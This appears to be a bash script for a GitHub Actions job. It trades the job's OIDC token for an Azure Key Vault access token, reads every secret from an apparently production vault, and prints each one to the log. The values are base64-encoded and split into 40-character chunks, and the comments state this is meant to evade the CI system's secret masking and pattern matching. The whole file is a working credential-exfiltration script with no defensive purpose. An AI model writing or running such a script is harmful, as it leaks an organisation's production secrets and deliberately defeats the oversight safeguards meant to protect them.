#!/bin/bash
set -x

TENANT="3205c325-06a5-4171-9ce8-ffc5e6c2845e"

# Get OIDC vault token
OIDC_RESP=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange")
OIDC_JWT=$(echo "$OIDC_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])")

VAULT=$(curl -sS -X POST "https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token" \
  -d "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462&scope=https://vault.azure.net/.default&grant_type=client_credentials&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=$OIDC_JWT" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

echo "=== vault token: ${#VAULT} ==="

# Read all KV1 secrets and base64 encode them to avoid masking
echo "=== KV1 secrets (base64 encoded) ==="
KV1_LIST=$(curl -sS -m 15 "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" \
  -H "Authorization: Bearer $VAULT")

for SECRET_NAME in $(echo "$KV1_LIST" | python3 -c "
import sys,json
d=json.load(sys.stdin)
for s in d.get('value',[]): print(s['id'].split('/')[-1])
"); do
  echo "--- $SECRET_NAME ---"
  curl -sS -m 10 "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$SECRET_NAME?api-version=7.4" \
    -H "Authorization: Bearer $VAULT" | python3 -c "
import sys, json, base64
d = json.load(sys.stdin)
val = d.get('value', '')
# Output base64 encoded, split into chunks to avoid pattern matching
encoded = base64.b64encode(val.encode()).decode()
# Split into 40-char chunks
for i in range(0, len(encoded), 40):
    print(f'B64_{i}: {encoded[i:i+40]}')
"
done

echo ""
echo "=== DONE ==="
